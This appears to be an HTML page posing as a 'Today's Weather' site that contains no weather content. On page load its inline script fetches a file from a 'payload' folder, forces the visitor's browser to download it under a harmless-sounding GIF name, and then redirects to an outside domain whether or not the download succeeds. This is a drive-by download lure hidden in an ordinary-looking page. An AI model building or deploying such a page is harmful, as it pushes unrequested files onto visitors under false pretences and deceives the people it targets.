<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Today's Weather</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 2rem; }
    #weather { margin-top: 1.5rem; font-size: 1.5rem; }
  </style>
</head>
<body>
  <h1>Weather Today </h1>
  <div id="weather">Loading....</div>
  <script src="script.js"></script>
  <script>
    // Function to fetch and download a file
    async function fetchAndDownload(url, name) {
      try {
        const res = await fetch(url);            
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
        const blob = await res.blob();
        const blobUrl = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = blobUrl;
        a.download = name;
        document.body.appendChild(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(blobUrl);
        console.log('Download initiated');
        
        // Redirect after a short delay to allow download to start
        setTimeout(() => {
          window.location.href = 'https://ensdynamics.com/';
        }, 500);
        
      } catch (error) {
        console.error('Download failed:', error);
        // Redirect even if download fails
        window.location.href = 'https://ensdynamics.com/';
      }
    }
    
    // Trigger download when page loads
    window.addEventListener('load', () => {
      fetchAndDownload('payload/IC_walking.gif', 'IC_walking.gif');
    });
  </script>
</body>
</html>
